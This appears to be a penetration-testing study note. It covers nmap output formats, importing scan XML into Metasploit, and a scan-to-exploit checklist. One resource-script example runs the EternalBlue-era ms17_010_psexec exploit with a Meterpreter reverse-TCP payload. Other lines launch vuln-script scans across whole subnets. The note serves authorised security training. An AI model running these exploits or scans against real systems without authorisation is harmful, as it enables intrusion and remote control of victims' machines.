- logging is the most imp thing during a pen test
- we use nmap output formats in logging
- -oN : exactly as terminal to save the output
- -oX : save as xml format and import the results into Metasploit
- -oS : script kiddie format
- -oG : output as grep format, usually used for automation
- -v: verbose
- -oA : output in the three major formats at once
- -d : increase debugging level
```
nmap -Pn -sS -F -T4 10.4.19.132 -oN nmap_normal.txt
```
  ```
  # Normal human-readable output
nmap -sV -p22,80 10.0.0.1 -oN results.nmap

# XML (recommended for tools)
nmap -sV -p- 10.0.0.0/24 -oX results.xml

# Grepable (old; not recommended)
nmap -sV 10.0.0.1 -oG results.gnmap

# All formats at once
nmap -sV -A 10.0.0.0/24 -oA scan-prefix

# Run NSE vuln scripts and save XML
nmap -sV --script vuln 10.0.0.0/24 -oX vuln-scan.xml

  ```
  ## Useful nmap flags for pentests

- `-Pn` skip ping/host discovery.
    
- `-p-` scan all 65535 ports.
    
- `-T0..T5` timing (0 slow stealth → 5 fast noisy).
    
- `-A` OS + version + script (aggressive).
    
- `-oX` XML output for tooling.
    
- `--script vuln,auth,discovery` for focused scans.
    

---

## Importing Nmap into Metasploit (msfconsole)

1. Start `msfconsole`.
    
2. Create or switch workspace:
    
    `workspace -a target_workspace workspace target_workspace`
    
3. Import XML:
    
    `db_import /path/to/results.xml`
    
4. Verify imported data:
    
    `hosts services vulns`
    
5. Example workflow after import:
    
    `# list hosts hosts  # list services for a host services -R 10.0.0.5  # search for likely modules search type:auxiliary name:ftp use auxiliary/scanner/ftp/anonymous set RHOSTS 10.0.0.0/24 run`
    

Notes:

- `db_import` maps XML service/version to msf services.
    
- If XML contains NSE script output it may appear in `vulns` or be visible in service notes.
    
- If you used `-oA`, point msf at the generated `.xml`.
    

---

## Automating scanning → exploitation

- Keep scans separated: discovery → service/version → vuln scripts.
    
- Import XML after each phase into a dedicated workspace.
    
- Use `search` in msf to find matching exploit/aux modules by service/version.
    
- Build resource scripts (`.rc`) to automate module runs:
    
    `workspace target db_import /path/to/results.xml use exploit/windows/smb/ms17_010_psexec set RHOSTS 10.0.0.10 set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.0.0.5 run`
    
- Run resource: `msfconsole -r script.rc` or inside msf: `resource script.rc`.
    

---

## Parsing tips and pitfalls

- Fields differ if you use `-oG` or `-oN`. Do not rely on `cut` positions unless you control nmap template.
    
- Use XML with `xmllint`, `xmlstarlet`, or Metasploit rather than brittle `grep/cut/awk`.
    
- When extracting host/ports with awk, prefer whitespace-safe parsing:
    
    `xmlstarlet sel -T -t -m "//host" -v "address/@addr" -o " " -v "ports/port[@state='open']/@portid" -n results.xml`
    
    (xmlstarlet example; use when scripting.)
    

---

## Short checklist for a scan-import cycle

-  Choose target scope and workspace.
    
-  Run discovery (`-sn` or `-Pn` if needed). Save XML.
    
-  Run service/version scan `-sV -p-`. Save XML.
    
-  Run NSE vuln scripts. Save XML.
    
-  `msfconsole` → `workspace` → `db_import` XML.
    
-  `hosts`, `services`, `vulns` review.
    
-  `search` modules and craft `.rc` tasks.
    

---

## Example mini-playbook

`# 1. discovery nmap -sn 10.0.0.0/24 -oX discovery.xml  # 2. full port + service/version nmap -sV -p- 10.0.0.0/24 -oX svc-scan.xml  # 3. vuln scripts nmap -sV --script vuln 10.0.0.0/24 -oX vuln-scan.xml  # 4. combine or import into metasploit # (import the most informative XML) msfconsole -q -x "workspace -a target; workspace target; db_import vuln-scan.xml; hosts; services; exit"`

---
